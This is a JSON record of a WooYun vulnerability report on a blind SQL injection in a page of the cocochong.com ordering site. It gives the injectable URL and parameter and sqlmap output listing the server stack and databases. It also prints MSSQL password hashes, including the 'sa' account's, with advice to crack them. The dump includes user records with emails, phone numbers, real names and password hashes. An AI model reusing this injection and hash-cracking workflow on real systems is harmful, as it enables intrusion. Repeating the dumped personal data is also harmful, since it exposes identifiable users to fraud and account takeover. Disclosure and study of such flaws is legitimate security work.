{"id": 61058, "wybug_id": "wooyun-2013-040913", "wybug_title": "壳壳虫sqlserver盲注导致用户数据泄露", "wybug_corp": "壳壳虫订购台", "wybug_author": "迷雾", "wybug_date": "2013-10-24 17:47", "wybug_open_date": "2013-12-08 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： cocochong主站某页面sql盲注漏洞，泄露用户数据，dump数据库 详细说明：  1. 注入url：http://www.cocochong.com/ajax/ajax.aspx?str=1&type=getart2      注入ID： str 2. 使用sqlmap查看系统数据库web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005available databases [20]:[*] back_newcoco[*] coco_easy[*] coco_easyliulan[*] coco_liulan[*] coco_ljl[*] coco_meiti[*] hkcocochong[*] hzp_coco[*] ludinggong[*] master[*] model[*] msdb[*] new_cocoljl[*] noya[*] qg[*] temp_newcoco[*] tempdb[*] Test[*] toupaicocochong[*] zhileng3. 扫描数据库当前用户和密码database management system users password hashes:                                                                                                                              [*] cocochongCYL [1]:    password hash: 0x01004a4661774b0b3214f68cf8c522ad728cad7b24a14275455c        header: 0x0100        salt: 4a466177        mixedcase: 4b0b3214f68cf8c522ad728cad7b24a14275455c[*] sa [1]:    password hash: 0x01004086ceb6e37abf38663d2b696ba773e81546d404e321266c        header: 0x0100        salt: 4086ceb6        mixedcase: e37abf38663d2b696ba773e81546d404e321266c将密码hash使用cain等工具进行破解4. 显示数据库back_newcoco所有表Database: back_newcoco[11 tables]+-----------------------+| coco_centerprobyclass || coco_focusmap         || coco_order            || coco_orderitem        || coco_paylog           || coco_plan             || coco_product          || coco_productclass     || coco_question         || coco_remart           || coco_user             |5. 查看表coco_user表结构Database: back_newcocoTable: coco_user[23 columns]+--------------+----------+| Column       | Type     |+--------------+----------+| address      | nvarchar || answer       | nvarchar || Balance      | money    || birthday     | datetime || city         | nvarchar || deliverdate  | int      || email        | nvarchar || gender       | bit      || isreeze      | bigint   || LoginCount   | int      || mobile       | nvarchar || paytype      | int      || question     | nvarchar || realname     | nvarchar || regtime      | datetime || state        | tinyint  || tel          | nvarchar || UserExp      | int      || UserExp2     | int      || userid       | int      || username     | nvarchar || userpassword | nvarchar || zipcode      | nvarchar |6. 抓取100名用户信息Database: back_newcocoTable: coco_user[10 entries]+---------------------+-------------+------------------+----------+----------------------------------+| email               | mobile      | username         | realname | userpassword                     |+---------------------+-------------+------------------+----------+----------------------------------+|  shfengm@chint.com  | 13671947811 | 13671947811      | <blank>  | D8159D894C4FA54AF10E475F2AE1972E || <2428592295@qq.com  | <blank>     | xd夏丹             | <blank>  | 402A7F59F21515E882EE3A99E7D5F183 || 1@126.com           | wewewewewe  | ceshi04          | 111111   | 25F9E794323B453885F5181F1B624D0B || 1002149907@qq.com   | 13428968481 | 13428968481      | 黄晓敏      | 7AD3A320E79D70D802DD8376590D85ED || 100279748@qq.com    | 13921209904 | 13921209904      | 钱丽娜      | FB138CFB652FF629DC2057362628BDCB || 100325886@qq.com    | 13914700418 | 13914700418      | 陈明       | 870A6E0FC19379F8EE2C8C53D463D930 || 1003778615@qq.com   | <blank>     | 1003778615       | <blank>  | 0AFBB701F9445582EDA0AD065C4AF9BF || 1005087122@qq.com   | 13683027007 | 13683027007      | 安晓奕      | A66DA0F0840D7E6C3591AEA32439E4ED || 100556565@qq.com    | 18012578306 | 100556565@qq.com | 杨辉       | BE676B6DE825F5F00249359E4AB69F9B || 1005721825@qq.com   | 18669259588 | vip              | 林姗姗      | E10ADC3949BA59ABBE56E057F20F883E |+---------------------+-------------+------------------+----------+----------------------------------+   漏洞证明：  已经证明   修复方案：  对用户的输入进行严格判断并过滤对数据库的操作进行监控分析   版权声明：转载请注明来源 迷雾@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}